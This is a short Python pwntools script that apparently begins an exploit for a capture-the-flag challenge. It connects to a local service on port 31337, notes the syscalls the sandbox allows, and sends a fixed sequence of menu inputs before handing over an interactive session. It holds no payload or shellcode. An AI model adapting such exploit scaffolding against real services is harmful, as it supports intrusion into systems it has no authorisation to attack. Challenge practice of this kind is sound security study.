from pwn import *

'''
Allowed calls:
sys_read
sys_write
sys_open
sys_exit
sys_exit_group
sys_fstat

1st input: 0 <= n1 <= 4
2nd input: 0 <= n2 <= 15

choice based on 1st input
'''

HOST, PORT = '0.0.0.0', 31337
r = remote(HOST, PORT)

r.send('0\n0\n1\n')
r.send('0\n1\n1\n')
r.send('0\n2\n1\n')

r.send(b'1\n0\n1\n65\n')
r.send(b'2\n0\n')

r.send('4\n2\n')
r.send('4\n1\n')
r.send('4\n0\n')



pause()

r.interactive()